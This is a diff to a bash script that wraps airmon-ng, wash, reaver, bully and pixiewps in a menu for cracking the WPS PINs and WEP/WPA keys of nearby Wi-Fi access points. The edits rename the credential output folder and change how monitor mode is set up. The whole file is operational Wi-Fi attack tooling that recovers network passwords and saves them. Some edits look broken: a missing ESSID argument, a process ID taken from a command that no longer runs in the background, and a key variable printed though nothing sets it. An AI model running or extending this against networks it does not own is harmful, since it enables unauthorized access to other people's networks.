@@ -418,12 +418,12 @@ Try_Multi_PIN_REAVER() {
 					done
 					if [ "$Key" != "" ]
 						then
-							echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-							echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-							echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-							echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-							echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-							echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+							echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+							echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+							echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+							echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+							echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+							echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 							echo ""
 							echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
 							echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
@@ -720,12 +720,30 @@ Ver_Mon_WCar_Fun() {
 						   done
 						   Wait_Msg="Enabling monitor mode on$Green $wlan $White."
 						   End_Msg="${Green}Mode Monitor$White is enabled ."
-						   trap kill_load SIGINT
-						   ifconfig $wlan down && iwconfig $wlan mode monitor && ifconfig $wlan up > /dev/null 2> /dev/null &
-						   PID="$!"
-						   Loading
+						   Ver_Mon=`echo $wlan | grep -E *mon$`
+						   if [ "$Ver_Mon" == "" ]
+						   	  then
+						   	      trap kill_load SIGINT
+						          airmon-ng start $wlan > /dev/null 2> /dev/null &
+						          PID="$!"
+						          Loading
+						   else
+						   	      wlan=`echo $wlan | rev | cut -c4- | rev`
+						   	      echo -ne "$White[${Green} ok ${White}] $End_Msg"
+						   	      echo ""
+						   fi
 						   trap - SIGINT SIGQUIT SIGTSTP
                            mode_monitor="active"
+                           if [ "$Ver_aircrack_ng" != "" ] || [ "$Ver_Mon" != "" ]
+                           	  then
+                                  Ver_Monitor_mode=`iwconfig ${wlan}mon 2>&1 | grep Mode:Monitor | awk '{print $1}'`
+                                  if [ "$Ver_Monitor_mode" == "" ] || [ "$Ver_Mon" != "" ]
+                                  	 then
+                                  	     ifconfig ${wlan}mon down
+                                  	     iwconfig ${wlan}mon mode monitor
+                                  	     ifconfig ${wlan}mon up
+                                  fi
+                           fi
                  elif [ "$VerCar" -le 0 ] && [ "$menu" -eq 6 ]
 				        then
 						    echo "" 
@@ -740,6 +758,7 @@ Ver_Mon_WCar_Fun() {
                             echo -e $White"     [${Red}!${White}] Wireless Card${Red} Not Found${White} ."
                             sleep 0.5
                  fi
+				 airmon-ng > ${Temporary}/.airmon-ng.txt
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
 }
@@ -829,7 +848,7 @@ Ver_Mon_Fun() {
 						   fi
 }
 Loading() {
-                disown $PID
+                
                 Finish=0
                 count=0
 				echo ""
@@ -1211,13 +1230,13 @@ WEP_function() {
 						            	then
 						            	    echo ""
 						            	    echo ""
-						            	    echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									        echo " [+] Privacy    >> $PRIVACY" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt 
-									        echo " [+] Hex Key    >> \"$Key_HEX\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt 
-									        echo " [+] ASCII Key  >> \"${Key_ASCII}\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-											echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+						            	    echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									        echo " [+] Privacy    >> $PRIVACY" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt 
+									        echo " [+] Hex Key    >> \"$Key_HEX\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt 
+									        echo " [+] ASCII Key  >> \"${Key_ASCII}\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+											echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 											echo ""
 											echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
 									        echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
@@ -1333,7 +1352,7 @@ SELECT_CAPTURE_CRACK() {
 									    		HHDP[$i]=0
 									    fi
 									    BLUE_MAC=0
-									    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
+									    if [ $(cat ${Desktop_PATH}/HT-WPS-PIN/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/HT-WPS-PIN/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
 											then
 											    echo -e -n $BBlue"$MAC\t"
 											    BLUE_MAC=1
@@ -1460,18 +1479,18 @@ SELECT_TO_CRACK() {
 						   fi
 }
 CRACKING_PROCESS() {
-                           Ver_Dir=`ls ${Desktop_PATH} | grep Passwords\ \&\ Pins 2> /dev/null`
+                           Ver_Dir=`ls ${Desktop_PATH} | grep HT-WPS-PIN 2> /dev/null`
 						   if [ "$Ver_Dir" == "" ];then
-								mkdir ${Desktop_PATH}/Passwords\ \&\ Pins
+								mkdir ${Desktop_PATH}/HT-WPS-PIN
 						   fi
-						   Ver_p=`ls ${Desktop_PATH}/Passwords\ \&\ Pins | grep ${BSSID} 2> /dev/null`
+						   Ver_p=`ls ${Desktop_PATH}/HT-WPS-PIN | grep ${BSSID} 2> /dev/null`
 						   Ver_PIN=0
 						   Ver_KEY=""
 						   if [ "$Ver_p" != "" ]
 								then
-									Ver_PIN=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'pin' | wc -l`
-									Ver_KEY=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'Key' | cut -d'"' -f2`
-									Ver_WEP=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'WEP'`
+									Ver_PIN=`cat ${Desktop_PATH}/HT-WPS-PIN/$BSSID* | grep -i 'pin' | wc -l`
+									Ver_KEY=`cat ${Desktop_PATH}/HT-WPS-PIN/$BSSID* | grep -i 'Key' | cut -d'"' -f2`
+									Ver_WEP=`cat ${Desktop_PATH}/HT-WPS-PIN/$BSSID* | grep -i 'WEP'`
 								else
 								    Ver_PIN=0
 						   fi
@@ -1482,20 +1501,20 @@ CRACKING_PROCESS() {
 						   			Cracking_Retry=$(($Cracking_Retry+1))
 						   if [ "$Ver_p" != "" ] && [ $Ver_PIN -gt 0 ] || [ "$Ver_KEY" != "" ]
 								then
-								    ESSID_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 1p | cut -c20-`
-                                    BSSID_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 2p | cut -c20-`
+								    ESSID_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 1p | cut -c20-`
+                                    BSSID_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 2p | cut -c20-`
                                     if [ "$Ver_WEP" != "" ]
                                     	then
-                                    		CHANNEL_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 4p | cut -c20-`
-                                    		Key_Hex_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
-                                    		Key_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 6p | awk -F\" '{print $2}'`
+                                    		CHANNEL_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 4p | cut -c20-`
+                                    		Key_Hex_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
+                                    		Key_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 6p | awk -F\" '{print $2}'`
                                     else
-                                    		CHANNEL_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 3p | cut -c20-`
-                                    		PIN_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 4p | awk -F\" '{print $2}'`
-                                    		Key_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
-                                    		time_taken_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 6p | cut -c20-`
+                                    		CHANNEL_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 3p | cut -c20-`
+                                    		PIN_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 4p | awk -F\" '{print $2}'`
+                                    		Key_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
+                                    		time_taken_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 6p | cut -c20-`
                                 	fi
-                                    cr_date_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 7p | cut -c20-`
+                                    cr_date_AC=`cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | sed -n 7p | cut -c20-`
 									echo ""
 									echo -e " ${Red} [${Yellow}+${Red}]$BGreen $BSSID$White is already cracked : "
                                     echo ""
@@ -1602,11 +1621,11 @@ CRACKING_PROCESS() {
                                               	  Last=0
                                               	  if [ "$Cracking_Retry" -lt 3 ]
                                               	  		then
-                                                  			pixiewps -e $e -r $r -s $s -z $z -a $a -n $n -v 3 --start 10/2011 --end 11/2011 | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
+                                                  			pixiewps -e $e -r $r -s $s -z $z -a $a -n $n -v 3 --start 10/2011 --end 11/2011 | tee ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt > /dev/null &
                                                   			PID="$!"
                                                   			Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White"
                                                   else
-                                                  			pixiewps -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
+                                                  			pixiewps -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt > /dev/null &
                                                   			PID="$!"
                                                   			Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                                   			Cracking_Retry=9796
@@ -1614,18 +1633,18 @@ CRACKING_PROCESS() {
                                                   fi
 												  End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                 								  Loading
-									              PIN=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
-									              time_taken=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
+									              PIN=`less ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
+									              time_taken=`less ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
 									          	  fi
 									          	  cr_date=`date`
 									              if [ "$PIN" != "" ]
 									                   then
 									                   		if [ "$HHDP" -eq "0" ]
 									                   			then
-									                        echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									                        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									                        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									                        echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+									                        echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									                        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									                        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									                        echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 									                        echo ""
 													        echo -e "${White}       [+] PIN  >>${Green} $PIN"
 													        echo -e "${White}       [+] Time taken >>${Red} $time_taken"
@@ -1645,40 +1664,26 @@ CRACKING_PROCESS() {
 										                             echo ""
 										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt 2> /dev/null &
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN 
 										                             PID="$!"
 										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
 										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
 										                             Loading
-										                             Key=`cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
-													                 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+										                             
 																 else
 																     echo ""
 																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 																	 echo ""
-																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt &
+																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN 
 																	 PID="$!"
 																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
 																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
 																	 Loading
-																	 Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
-																	 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+																	
 															fi
 															if [ "$ByPASS_Result" -eq "0" ]
 																then
-																	echo " [+] Time Taken >> $time_taken" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-																	echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-																	echo ""
-																	echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
-									                        		echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
-									                        		echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
-									                        		echo -e "${White} [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
-									                        		echo -e "${White} [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
-									                        		if [ "$HHDP" -eq "0" ]
-									                        			then
-									                        				echo -e "${White} [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
-									                        		fi
-																	echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
+																	
 																	echo ""
 									                        		echo -e "$White [${Yellow}+${White}]$Green Congratulation ${White}(${Red}^${White}_${Red}^${White})"
 													        		echo ""
@@ -1693,16 +1698,16 @@ CRACKING_PROCESS() {
 													        Mu_KEY[$MA]=$Key
 													        Cracking_Retry=9796
 									               else
-									               		TIME2RE=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep "Time" | awk '{print $4}'`
+									               		TIME2RE=`less ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | grep "Time" | awk '{print $4}'`
 									               		if [[ "$TIME2RE" =~ ^[+-]?[0-9]+$ ]]
 									               			then
 									               				if [ "$TIME2RE" -lt "4" ] || [ "$Last" -eq "1" ]
 									               					then
-									               						cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
+									               						cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
 									               						echo ""
 												    					echo -e "$White        [${Red}!${White}] Sorry pin not found , good luck next time."
 												    					echo ""
-												    					rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+												    					rm -rf ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 												    			else
 												    					echo ""
 												    					echo -e "$White        [${Red}!${White}]${Red} $Cracking_Retry${White} attempt is${Red} Failed ."
@@ -1710,11 +1715,11 @@ CRACKING_PROCESS() {
 												    			fi
 												    	elif [ "$Last" -eq "1" ]
 												    		then
-												    					cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
+												    					cat ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
 									               						echo ""
 												    					echo -e "$White        [${Red}!${White}] Sorry pin not found , good luck next time."
 												    					echo ""
-												    					rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+												    					rm -rf ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 												    	else
 												    			TIME2RE=10
 												    	fi
@@ -2191,7 +2196,7 @@ case $menu in
                       then
                            Ver_Mon_Fun
 						   trap kill_wash SIGINT
-						   wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
+						   wash -i $mon -o ${Temporary}/wash.txt > /dev/null &
 						   WashID="$!"
 						   disown $WashID
 						   for ((c=0; c<=3; c++))
@@ -2302,7 +2307,7 @@ case $menu in
 									    		HHDP[$i]=0
 									    fi
 									    BLUE_MAC=0
-									    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
+									    if [ $(cat ${Desktop_PATH}/HT-WPS-PIN/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/HT-WPS-PIN/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
 											then
 											    echo -e -n $BBlue"$MAC      "
 											    BLUE_MAC=1
@@ -2459,20 +2464,20 @@ case $menu in
 						   if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]
 									      then
                                               trap kill_load SIGINT
-                                              pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
+                                              pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt > /dev/null &
                                               PID="$!"
                                               Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                               End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                                               Loading
-                                              echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									          echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-									          echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+                                              echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									          echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+									          echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 											  #pixiewps -v 3 -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/${BSSID}.txt | head -n 11 | tail -n 9
-									          PIN=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
-									          time_taken=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
+									          PIN=`less ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
+									          time_taken=`less ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
 											     if [ "$PIN" != "" ]
 									                   then
-									                   		echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+									                   		echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 													        echo ""
 									          				echo -e "${White}       [+] PIN  >>${Green} $PIN"
 									          				echo -e "${White}       [+] Time taken >>${Red} $time_taken"
@@ -2486,30 +2491,27 @@ case $menu in
 										                             echo ""
 										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt 2> /dev/null &
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN 
 										                             PID="$!"
 										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
 										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
 										                             Loading
-										                             Key=`cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
-													                 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
-																 else
+										                             else
 																     echo ""
 																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 																	 echo ""
-																	 reaver -i $mon -b $BSSID -c $CHANNEL -e -n -vv -p $PIN > ${Temporary}/Get_Pass.txt &
+																	 reaver -i $mon -b $BSSID -c $CHANNEL -e -n -vv -p $PIN
 																	 PID="$!"
 																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
 																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
 																	 Loading
-																	 Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
-																	 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+																	
 															fi
 									              else
 									                   echo ""
 										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
 												       echo ""
-													   rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
+													   rm -rf ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 									              fi
 						                 else
 										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
